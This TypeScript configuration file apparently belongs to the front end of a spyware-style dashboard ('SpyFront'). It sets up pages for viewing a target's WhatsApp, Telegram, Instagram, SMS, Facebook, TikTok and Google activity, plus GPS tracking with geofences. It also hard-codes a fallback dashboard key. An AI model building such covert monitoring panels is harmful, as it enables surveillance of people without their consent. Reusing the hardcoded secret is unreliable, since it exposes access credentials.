export const API_BASE_URL = import.meta.env.VITE_API_URL ?? '';
export const DASHBOARD_KEY = import.meta.env.VITE_DASHBOARD_KEY ?? 'DashK3y_SpyFront_2026_Secure!';

export interface AppPageConfig {
  title: string;
  description: string;
  icon: string;
  headerColor: string;
  appKey: string;
  matchKeys: string[];
}

export const APP_PAGE_CONFIG: Record<string, AppPageConfig> = {
  whatsapp: {
    title: 'WhatsApp',
    description: 'Mensajes, alertas y contactos importantes.',
    icon: '💬',
    headerColor: '#00c463',
    appKey: 'whatsapp',
    matchKeys: ['whatsapp', 'whatsapp', 'whatssapp', 'wa', 'whats app'],
  },
  telegram: {
    title: 'Telegram',
    description: 'Mensajes seguros y notificaciones de canales.',
    icon: '✈',
    headerColor: '#18a0fb',
    appKey: 'telegram',
    matchKeys: ['telegram', 'tg'],
  },
  instagram: {
    title: 'Instagram',
    description: 'Actividad, comentarios e interacciones sociales.',
    icon: '📸',
    headerColor: '#ff5ed9',
    appKey: 'instagram',
    matchKeys: ['instagram', 'insta', 'ig'],
  },
  sms: {
    title: 'SMS',
    description: 'Mensajes de texto, alertas y remitentes.',
    icon: '✉',
    headerColor: '#00ffb8',
    appKey: 'sms',
    matchKeys: ['sms', 'text', 'mensaje', 'mensajetexto'],
  },
  facebook: {
    title: 'Facebook',
    description: 'Publicaciones, reacciones y mensajes directos.',
    icon: 'f',
    headerColor: '#3b5998',
    appKey: 'facebook',
    matchKeys: ['facebook', 'fb'],
  },
  tiktok: {
    title: 'TikTok',
    description: 'Videos, comentarios y actividad viral.',
    icon: '♪',
    headerColor: '#fe2c55',
    appKey: 'tiktok',
    matchKeys: ['tiktok', 'tik tok'],
  },
  google: {
    title: 'Google',
    description: 'Búsquedas, actividad de cuenta y registros de servicios.',
    icon: 'G',
    headerColor: '#4285f4',
    appKey: 'google',
    matchKeys: ['google', 'gmail', 'search', 'chrome'],
  },
  ubicacion: {
    title: 'Ubicación',
    description: 'Rastreo GPS, historial de localizaciones y geocercas.',
    icon: '📍',
    headerColor: '#ff9800',
    appKey: 'ubicacion',
    matchKeys: ['ubicacion', 'ubicación', 'location', 'gps', 'mapa'],
  },
};

export const APP_PAGE_MAP: Record<string, string> = {
  whatsapp: 'whatsapp',
  telegram: 'telegram',
  instagram: 'instagram',
  sms: 'sms',
  facebook: 'facebook',
  tiktok: 'tiktok',
  google: 'google',
  ubicacion: 'ubicacion',
};
